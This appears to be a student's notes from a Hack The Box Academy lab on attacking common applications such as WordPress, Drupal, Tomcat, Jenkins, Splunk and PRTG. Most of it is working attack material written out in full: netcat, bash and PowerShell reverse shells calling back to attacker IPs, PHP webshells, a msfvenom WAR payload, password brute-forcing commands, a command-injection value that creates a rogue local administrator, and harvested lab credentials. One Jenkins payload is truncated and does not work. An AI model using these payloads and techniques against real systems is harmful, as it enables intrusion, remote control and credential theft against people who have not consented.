# Attacking Common Applications  

>Preparing the attack host for lab exercises:  

```
IP=10.129.x.x
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Initial Web Discovery  

>Script to do Web discovery using with NMAP, EyeWitness and Aquatone taking screenshot images of HTML:  [Application Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1088)

>`nmap-web-discovery.sh`  

```bash
sudo nmap -p 80,443,5357,8000,8009,8080,8089,8180,8443,8888,10000,10001 --open -oA web_discovery -iL scope_list

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

cat web_discovery.xml | /home/kali/Downloads/htb/academy/common-apps/aquatone -nmap
```  


| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo vim /etc/hosts`                                        | Opens the `/etc/hosts` with `vim` to start adding host names  |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`) |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>` | Runs `eyewitness` using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`) |
| `cat web_discovery.xml \| ./aquatone -nmap`                  | Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it to aquatone (`./aquatone`) while ensuring aquatone recognizes the file as nmap scan output (`-nmap`) |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate` | Runs wpscan using the `--enmuerate` flag. Can replace the url with any valid and reachable URL in each challenge |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`) |
| `curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id` | cURL command used to execute commands (`cmd=id`) on a vulnerable system utilizing a php-based webshell |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");` | PHP code that will execute a reverse shell on a Linux-based system |
| `droopescan scan joomla --url http://<domainnameoripaddress>` | Runs `droopescan` against a joomla site located at the specified url |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>` | Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`) |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` | PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browsing to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command. |
| `curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"` | Uses curl to navigate to php web shell file and run system commands (`=id`) on the target |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | `gobuster` powered directory brute forcing attack referencing a wordlist (`/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`) |
| `auxiliary/scanner/http/tomcat_mgr_login`                    | Useful Metasploit scanner module used to perform a brute force login attack against a tomcat site |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (`-P /manager`) and references a specified user or userlist ( `-u`) as well as a specified password or password list (`-p`) |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war` | Generates a jsp-based reverse shell payload in the form of a .war file utilizing `msfvenom` |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>` | Nmap scan useful in enumerating Apache Tomcat and AJP services |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()` | Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Linux |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` | Groovy-based payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. This will allow webshell access and to execute commands on the underlying Windows system |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);` | Groovy-based reverse shell payload/code that can work with admin acess to the `Script Console` of a `Jenkins`site. Will work when the underlying OS is Windows |
| [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)              | A simple Splunk package for obtaining reverse shells on Windows and Linux systems |
|                                                              |                                                              |
|                                                              |                                                              |


# Common Applications Exercises  

## WordPress  

>[WordPress - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1100)  
>WPScan enumerate target:
```
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token rfzQVksSGlICnUWX6uY4RxW9tCuwcRaJvwqWyfEalSk
```  

>Identified the user `doug`, Brute force password:
```
sudo wpscan --url http://blog.inlanefreight.local/ --passwords /usr/share/wordlists/rockyou.txt --usernames doug -t 25 --api-token rfzQVksSGlICnUWX6uY4RxW9tCuwcRaJvwqWyfEalSk
```

>Cracked password for Wordpress user `doug`:`jessica1`.

### WordPress Attack Chain  

+ Login to wordpress, as `doug`:`jessica1` with aim to get Reverse shell
+ Deactivate plugin `akismet/akismet.php`
+ Edit top of PHP page for plugin with reverse shell `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.38 443 >/tmp/f")?>` 
+ Start netcat listener on port 433, `rlwrap nc -nvlp 443`
+ Activate plugin, `akismet/akismet.php`
+ In low shell, upgrade to full interactive shell, `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+ Find flag.txt, `find / -name flag.txt -type f -exec ls -la {} \; 2>/dev/null`
+ Enumerate local users `ls -al /home`
+ Find users locally with login shell `bash` access: `cat /etc/passwd | grep -ie 'sh'`
+ Identify contents of web root directories and folders: `ls -al /var/www/`
+ Password hunting in config files, `cat wp-config.php`. Found credentials for MySQL database username `wordpressadm:`HTB_@cademy_WP!`
+ MySQL enumeration on local `mysql -u wordpressadm -p`, and list `select user_login,user_pass from wp_users;`

## Joomla

>[Joomla - Discovery Enumeration Attack](https://academy.hackthebox.com/module/113/section/1095)

### Joomla Attack Chain  

>Enumeration droopescan `droopescan scan joomla --url http://app.inlanefreight.local`
>[joomla Brute force login](https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py): `sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin`

>Credentials discovered via brute force: `admin:turnkey`  

>Enumeration using the low shell obtained via ***WordPress***:  

```
cd /var/www/app.inlanefreight.local
```

>Information gathered:  

* cat configuration.php - `joomlaadm`:`HTB_@caedmy_Joomla!`  
* cat htaccess.txt
* cat index.html.bak

```
cd /var/www/dev.inlanefreight.local
cat configuration.php - `joomlaadm`:`HTB_@caedmy_Joomla!`  
```  

>[Joomla Authenticated reverse shell](https://academy.hackthebox.com/module/113/section/1210)  

## Drupal  

### Discovery & Enumeration  

>[Drupal - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1089)  

>Enumeration: `droopescan scan drupal -u http://drupal.inlanefreight.local`

>Enumeration of Drupal backend using the low shell obtained via ***WordPress***:  

```
cd /var/www/drupal.inlanefreight.local

find . | grep --color=auto -nr -ie "passw" --color=always 2>/dev/null
```  

>[Attacking Drupal]{https://academy.hackthebox.com/module/113/section/1209)  
>Authentication to Drupal `admin`:`admin`

>After enable PHP filters on Drupal, Create basic page with payload that allow use of PHP webshell:  

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```  

>WebShell Usage:
```
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">
```  

## Tomcat  

>[Tomcat - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1090)  

>web directory enumeration:  
```
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```  

### Tomcat Attack Chain  

>Brute force basic authentication with MSFCONSOLE - `msf6 auxiliary scanner/http/tomcat_mgr_login`

>Alternative: [mgr_brute.py](https://raw.githubusercontent.com/b33lz3bub-1/Tomcat-Manager-Bruteforce/master/mgr_brute.py)  

```
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
set USER_FILE /home/kali/Downloads/htb/academy/common-apps/tomcat.txt
run
```  

>Login Successful: tomcat:root

>[Tomcat Manager - WAR File Upload](https://academy.hackthebox.com/module/113/section/1211)  
>Msfvenom payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.38 LPORT=4443 -f war > backup.war`  
>Start Listener: `sudo msfconsole; use exploit/multi/handler; run`  

>Tomcat Manager - WAR File Upload [http://web01.inlanefreight.local:8180/manager/html](http://web01.inlanefreight.local:8180/manager/html) - WAR file to deploy `backup.war`

>Execute WAR file to connect reverse shell, after it been uploaded.  

>Obtained remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. 
>Find and submit the contents of `find / -name tomcat_flag.txt -type f -exec ls -la {} \; 2>/dev/null`

>Flag : `cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`.  
  
## Splunk   

>[Splunk SIEM - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1092)  

>Splunk, the default credentials are `admin`:`changeme`.  
>Common weak passwords such as:
```
admin
Welcome
Welcome1
Password123
```  

### Discovery & Enumeration  

>Port scan with nmap splunk target:  

```
sudo nmap -p 80,135,139,445,3389,8000,8080,8089,5985,47001 -sCV -A -O 10.129.201.50 -oA splunk
```  

>NMAP Output below indicate Splunk version 8.2.2 running at URL `https://10.129.201.50:8000/en-US/app/launcher/home`  

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: APP03
|   NetBIOS_Domain_Name: APP03
|   NetBIOS_Computer_Name: APP03
|   DNS_Domain_Name: APP03
|   DNS_Computer_Name: APP03
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-27T05:58:39+00:00
|_ssl-date: 2023-07-27T05:59:18+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=APP03
| Not valid before: 2023-07-26T05:53:24
|_Not valid after:  2024-01-25T05:53:24
8000/tcp  open  ssl/http      Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=APP03/organizationName=SplunkUser
| Not valid before: 2021-08-27T16:52:08
|_Not valid after:  2024-08-26T16:52:08
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was https://10.129.201.50:8000/en-US/account/login?return_to=%2Fen-US%2F
8080/tcp  open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (APP03)
|_Requested resource was /index.htm
|_http-open-proxy: Proxy might be redirecting requests
8089/tcp  open  ssl/http      Splunkd httpd
|_http-title: splunkd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
```  

### Splunk Attack  

>Download payload from `https://github.com/0xjpuff/reverse_shell_splunk.git`

>Modify the PowerShell reverse shell script:

```PowerShell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.216',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```  

>inputs.conf configuration for Splunk App package:  
```
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = pentest 

[script://.\bin\run.bat]
disabled = 0
sourcetype = pentest
interval = 10
```

>Create install app from file `.spl` file: `tar -cvzf updater.tar.gz reverse_shell_splunk`  

>Start Netcat listener on Kali: `rlwrap nc -nvlp 443`  

>On Splunk Web Appliation dashboard, `https://10.129.201.50:8000/en-US/manager/search/apps/local`, select option `Install app from file`.  

![splunk attack-reverse-shell](/images/splunk-attack-reverse-shell.png)  

>Looting, `get-content c:\loot\flag.txt`  

## PRTG Network Monitor  

>Default creds: `prtgadmin:prtgadmin` or `prtgadmin:Password123`

>Enumerate Version with `curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version`

### PRTG Attack  

>[Attack chain: PRTG - Setup - Account Settings menu - Notifications](https://academy.hackthebox.com/module/113/section/1094)  
>Logged in as prtg admin, we create new notification and set to execute a program.
>The program command to execute `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`, will create new local administrator user.

![prtg-attack](/images/prtg-attack.png)  

>Execution of the notivation clicking on the `Send Test notification`

>Validate from Kali new administrator access: `sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!`

>Flag:
```
cd c:\users\administrator\desktop
get-content flag.txt
```  

## osTicket  

>[Helpdesk software - powered by osTicket](https://academy.hackthebox.com/module/113/section/1214)  

### Attack Kill Chain osTockit  

+ Footprint - Exploit wep app functions and work flow if no vulnerabilities found in research.  
+ Discovery - Open a new support ticket as `john@john.com` and obtain email address `950435@inlanefreight.local`, that match ticket id.
+ Enumeration - Check Ticket status and Login with `john@john.com` and the `950435` ticket number.  
+ OSINT - `https://dehashed.com/` discover: `email : kevin@inlanefreight.local, password : Fish1ng_s3ason!`  
+ linkedin2username - create a user list of company employees and attempt a password spraying attack against the VPN endpoint 
+ Exploit sensitive info with `kevin` employee login: `http://support.inlanefreight.local/scp/tickets.php?a=search&status=closed&uid=7` find closed ticket with password to User: `Charles Smithson, Email:	charles.smithson@inlanefreight.local password: Inlane_welcome!`  

## Gitlab  

>...


